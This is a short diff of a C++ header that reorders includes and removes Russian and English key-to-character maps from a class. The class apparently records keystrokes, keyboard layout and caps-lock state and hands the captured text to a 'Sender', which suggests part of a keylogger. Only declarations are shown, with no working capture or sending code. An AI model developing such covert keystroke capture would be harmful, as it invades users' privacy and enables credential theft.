@@ -1,12 +1,10 @@
 #pragma once
 #include <string>
-#include <map>
-#include <vector>
-#include <Windows.h>
 #include <iostream>
 #include <fstream>
 #include "Sender.h"
 #include "FabricSender.h"
+#include <Windows.h>
 
 #define MAKELANGID(p, s)       ((((WORD  )(s)) << 10) | (WORD  )(p))
 #define PRIMARYLANGID(lgid)    ((WORD  )(lgid) & 0x3ff)
@@ -21,8 +19,6 @@ private:
 	string simbols = "";
 	static LANGID langId;
 	bool is_capslock = false;
-	static map <int, vector<char>> btnKeyRu;
-	static map <int, vector<char>> btnKeyEn;
 	DWORD processId;
 	HWND hwnd;
 	HKL kLayout;
